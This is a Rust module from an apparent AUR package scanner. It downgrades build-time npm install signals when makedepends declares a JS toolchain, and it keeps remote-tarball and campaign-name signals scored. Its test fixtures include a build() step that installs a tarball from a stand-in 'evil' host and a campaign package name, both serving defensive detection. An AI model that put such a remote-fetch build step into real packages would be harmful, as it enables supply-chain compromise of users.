//! Adjust signal roles using what the PKGBUILD itself declares.
//!
//! A lifecycle fact is only benign when the declaration explains it. The 2026
//! Atomic Arch campaign pushed npm dependencies into `build()`; a source build
//! with an npm frontend does the same thing legitimately. The two are
//! distinguishable without guessing, because Arch requires build tools to be
//! declared in `makedepends`.
//!
//! This pass runs after every feature, before scoring, and can only *lower* a
//! role (Capability -> Fact). It never promotes anything, so it cannot invent
//! risk; the worst it can do is leave detection as it was.

use crate::shared::models::PackageContext;
use crate::shared::scoring::Signal;
use regex::Regex;
use std::sync::LazyLock;

/// `makedepends=('git' 'npm')` and friends, including the `+=` append form
/// and arch-specific variants.
static DEPS_ARRAY_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?m)^[a-z]*(depends)?(_[a-z0-9_]+)?\s*\+?=\s*\(([^)]*)\)").unwrap()
});

/// `npm`, `pnpm`, `bun`, `yarn`, `corepack`, `nodejs` and friends.
static JS_TOOL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(npm|pnpm|bun|yarn|corepack|nodejs|deno)\b").unwrap());

/// Signals that describe a build-time JavaScript dependency install.
const JS_INSTALL_SIGNALS: &[&str] = &[
    "P-NPM-INSTALL-BUILDTIME",
    "P-INSTALL-NPM-INSTALL-BUILDTIME",
];

/// Signals that stay suspicious even when a JS toolchain is declared, because
/// they fetch code from outside `source=()`.
const JS_REMOTE_SIGNALS: &[&str] = &[
    "P-NPM-REMOTE-TARBALL",
    "P-NPM-ATOMIC-ARCH-NAMES",
    "G-DOWNLOAD-NODE",
];

/// Rewrite roles on `signals` using declarations found in `ctx`.
pub fn apply(ctx: &PackageContext, signals: &mut [Signal]) {
    let Some(pkgbuild) = ctx.pkgbuild_content.as_deref() else {
        return;
    };
    let declares_js_toolchain = declares_js_toolchain(pkgbuild);
    let has_remote_install = signals
        .iter()
        .any(|s| JS_REMOTE_SIGNALS.contains(&base_id(&s.id)));

    for signal in signals.iter_mut() {
        let base = base_id(&signal.id);

        // A pattern that the registry scores at zero points carries no risk:
        // it was superseded by a classifier that decides properly. Saying so in
        // the report is more honest than listing it as a live capability.
        if signal.points == 0 && signal.role == crate::shared::scoring::SignalRole::Capability {
            signal.role = crate::shared::scoring::SignalRole::Fact;
        }

        // A declared npm/pnpm/bun build dependency makes the install a fact.
        // A remote tarball or a known campaign package name keeps it scored.
        if JS_INSTALL_SIGNALS.contains(&base) && declares_js_toolchain && !has_remote_install {
            signal.role = crate::shared::scoring::SignalRole::Fact;
            signal.description.push_str(
                " (declared in makedepends; treated as a declared build dependency)",
            );
        }
    }
}

/// Strip a feature prefix (`IS-`, `LS-`) so id lookups work for install
/// scripts and local sources too.
fn base_id(id: &str) -> &str {
    id.strip_prefix("IS-")
        .or_else(|| id.strip_prefix("LS-"))
        .unwrap_or(id)
}

/// Whether `makedepends` (or any `*depends`) declares a JavaScript toolchain.
fn declares_js_toolchain(pkgbuild: &str) -> bool {
    DEPS_ARRAY_RE.captures_iter(pkgbuild).any(|caps| {
        let body = &caps[3];
        JS_TOOL_RE.is_match(body)
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shared::scoring::{SignalCategory, SignalRole};

    fn ctx(pkgbuild: &str) -> PackageContext {
        PackageContext {
            name: "test".into(),
            metadata: None,
            pkgbuild_content: Some(pkgbuild.to_string()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
            github_stars: None,
            github_not_found: false,
            aur_comments: vec![],
            local_sources: vec![],
            source_path: None,
            incomplete: vec![],
        }
    }

    fn sig(id: &str) -> Signal {
        Signal::new(id, SignalCategory::Pkgbuild, 55)
    }

    #[test]
    fn declared_npm_makes_install_a_fact() {
        let mut signals = vec![sig("P-NPM-INSTALL-BUILDTIME")];
        apply(
            &ctx("pkgname=x\nmakedepends=('git' 'npm')\nbuild() { npm install; }\n"),
            &mut signals,
        );
        assert_eq!(signals[0].role, SignalRole::Fact);
    }

    #[test]
    fn undeclared_npm_stays_a_capability() {
        let mut signals = vec![sig("P-NPM-INSTALL-BUILDTIME")];
        apply(
            &ctx("pkgname=x\nmakedepends=('gcc')\nbuild() { npm install; }\n"),
            &mut signals,
        );
        assert_eq!(signals[0].role, SignalRole::Capability);
    }

    #[test]
    fn pnpm_and_corepack_count() {
        let mut signals = vec![sig("P-NPM-INSTALL-BUILDTIME")];
        apply(
            &ctx("makedepends=('corepack' 'pnpm')\nbuild() { pnpm install; }\n"),
            &mut signals,
        );
        assert_eq!(signals[0].role, SignalRole::Fact);
    }

    #[test]
    fn remote_tarball_keeps_it_scored_even_when_declared() {
        let mut signals = vec![
            sig("P-NPM-INSTALL-BUILDTIME"),
            sig("P-NPM-REMOTE-TARBALL"),
        ];
        apply(
            &ctx("makedepends=('npm')\nbuild() { npm install https://evil/x.tgz; }\n"),
            &mut signals,
        );
        assert_eq!(signals[0].role, SignalRole::Capability);
    }

    #[test]
    fn atomic_arch_names_never_downgraded() {
        let mut signals = vec![
            sig("P-NPM-INSTALL-BUILDTIME"),
            sig("P-NPM-ATOMIC-ARCH-NAMES"),
        ];
        apply(
            &ctx("makedepends=('npm')\nbuild() { npm install atomic-lockfile; }\n"),
            &mut signals,
        );
        assert_eq!(signals[0].role, SignalRole::Capability);
    }

    #[test]
    fn install_script_prefix_is_understood() {
        let mut signals = vec![sig("IS-P-NPM-INSTALL-BUILDTIME")];
        apply(
            &ctx("makedepends=('npm')\nbuild() { :; }\n"),
            &mut signals,
        );
        assert_eq!(signals[0].role, SignalRole::Fact);
    }

    #[test]
    fn only_drops_roles_never_promotes() {
        // A scored capability is untouched by an unrelated declaration.
        let mut signals = vec![sig("P-CURL-PIPE")];
        apply(&ctx("makedepends=('npm')\n"), &mut signals);
        assert_eq!(signals[0].role, SignalRole::Capability);
    }

    #[test]
    fn superseded_zero_point_pattern_is_reported_as_a_fact() {
        // P-EVAL-VAR is retained for compatibility at zero points; eval_analysis
        // decides. The role axis zeroes it and the report labels it as such.
        let mut signals = vec![Signal::new("P-EVAL-VAR", SignalCategory::Pkgbuild, 0)];
        apply(&ctx("build() { :; }\n"), &mut signals);
        assert_eq!(signals[0].role, SignalRole::Fact);
        assert_eq!(signals[0].points, 0);
    }
}
